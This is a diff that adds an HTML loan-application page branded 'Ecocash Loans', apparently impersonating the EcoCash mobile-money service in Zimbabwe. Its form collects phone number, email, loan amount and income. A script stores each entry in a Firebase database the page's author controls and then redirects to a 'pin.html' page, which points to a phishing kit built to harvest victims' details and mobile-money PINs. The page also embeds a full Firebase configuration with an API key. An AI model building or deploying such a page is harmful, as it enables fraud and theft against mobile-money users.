@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ecocash Loans</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:linear-gradient(180deg,#2563eb,#1e40af);
+padding:20px;
+}
+
+.card{
+width:100%;
+max-width:430px;
+background:#fff;
+border-radius:30px;
+padding:28px;
+box-shadow:0 20px 40px rgba(0,0,0,.18);
+}
+
+.logo{
+text-align:center;
+font-size:34px;
+font-weight:700;
+margin-bottom:8px;
+}
+
+.logo .nexa{
+color:#2563eb;
+}
+
+.logo .fund{
+color:#06b6d4;
+}
+
+.subtitle{
+text-align:center;
+color:#666;
+font-size:15px;
+margin-bottom:30px;
+}
+
+.field{
+margin-bottom:18px;
+}
+
+label{
+display:block;
+font-weight:600;
+margin-bottom:8px;
+color:#333;
+}
+
+input,
+select{
+width:100%;
+padding:15px;
+border:1px solid #d8d8d8;
+border-radius:14px;
+font-size:16px;
+outline:none;
+transition:.25s;
+background:#fafafa;
+}
+
+input:focus,
+select:focus{
+border-color:#2563eb;
+background:#fff;
+}
+
+.phone{
+display:flex;
+gap:10px;
+}
+
+.phone select{
+width:120px;
+}
+
+.phone input{
+flex:1;
+}
+
+button{
+width:100%;
+padding:16px;
+border:none;
+border-radius:16px;
+background:#2563eb;
+color:#fff;
+font-size:18px;
+font-weight:600;
+cursor:pointer;
+transition:.25s;
+}
+
+button:hover{
+background:#1d4ed8;
+}
+
+button:disabled{
+opacity:.7;
+cursor:not-allowed;
+}
+
+#toast{
+position:fixed;
+bottom:30px;
+left:50%;
+transform:translateX(-50%);
+padding:14px 20px;
+border-radius:12px;
+color:#fff;
+font-weight:600;
+display:none;
+z-index:999;
+}
+
+.success{background:#16a34a;}
+.error{background:#dc2626;}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<div class="logo">
+<span class="eco">Eco</span><span class="fund">Cash</span>
+</div>
+
+<p class="subtitle">
+Complete your application below.
+</p>
+
+<form id="loanForm">
+
+<div class="field">
+<label>Mobile Number</label>
+
+<div class="phone">
+<select id="country">
+<option value="+263">🇿🇼 +263</option>
+</select>
+
+<input
+type="tel"
+id="phone"
+placeholder="712345678"
+required>
+</div>
+
+</div>
+
+<div class="field">
+<label>Email Address</label>
+<input
+type="email"
+id="email"
+placeholder="name@example.com"
+required>
+</div>
+
+<div class="field">
+<label>Loan Amount (usd)</label>
+<input
+type="number"
+id="amount"
+placeholder="5000"
+required>
+</div>
+
+<div class="field">
+<label>Loan Purpose (usd)</label>
+
+<select id="purpose">
+<option>Business</option>
+<option>Education</option>
+<option>Medical</option>
+<option>Rent</option>
+<option>Personal</option>
+<option>Emergency</option>
+</select>
+
+</div>
+
+<div class="field">
+<label>Monthly Income (usd)</label>
+
+<input
+type="number"
+id="income"
+placeholder="35000"
+required>
+
+</div>
+
+<button type="submit" id="submitBtn">
+Continue
+</button>
+
+</form>
+
+</div>
+
+<div id="toast"></div>
+
+<script>
+function toast(msg,type){
+
+const t=document.getElementById("toast");
+
+t.className=type;
+t.innerText=msg;
+t.style.display="block";
+
+setTimeout(()=>{
+t.style.display="none";
+},3000);
+
+}
+</script>
+
+</body>
+</html>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDbx8tqZiN7xqUmj-obf1LwroYTV8FuRrk",
+  authDomain: "ecocash-loans-b8ff4.firebaseapp.com",
+  databaseURL: "https://ecocash-loans-b8ff4-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "ecocash-loans-b8ff4",
+  storageBucket: "ecocash-loans-b8ff4.firebasestorage.app",
+  messagingSenderId: "965007030441",
+  appId: "1:965007030441:web:fd828795a365eca5ab11b8",
+  measurementId: "G-XCZW21GNZ8"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+const db = firebase.database();
+
+const form = document.getElementById("loanForm");
+const submitBtn = document.getElementById("submitBtn");
+
+function toast(message, type = "success") {
+    const t = document.getElementById("toast");
+
+    t.textContent = message;
+    t.className = type;
+    t.style.display = "block";
+
+    setTimeout(() => {
+        t.style.display = "none";
+    }, 3000);
+}
+
+form.addEventListener("submit", function(e){
+
+    e.preventDefault();
+
+    const country = document.getElementById("country").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const amount = document.getElementById("amount").value.trim();
+    const purpose = document.getElementById("purpose").value;
+    const income = document.getElementById("income").value.trim();
+
+    if(!phone || !email || !amount || !income){
+        toast("Please complete all fields.","error");
+        return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Submitting...";
+
+    const application = {
+        phone: country + phone,
+        email: email,
+        loanAmount: Number(amount),
+        purpose: purpose,
+        monthlyIncome: Number(income),
+        status: "Pending",
+        createdAt: Date.now()
+    };
+
+    db.ref("applications")
+      .push(application)
+      .then(() => {
+
+          toast("Application submitted successfully.","success");
+
+          setTimeout(() => {
+              window.location.href = "pin.html";
+          }, 1200);
+
+      })
+      .catch((error) => {
+
+          toast(error.message,"error");
+
+          submitBtn.disabled = false;
+          submitBtn.textContent = "Continue";
+      });
+
+});
+</script>
+</body>
+  </html>
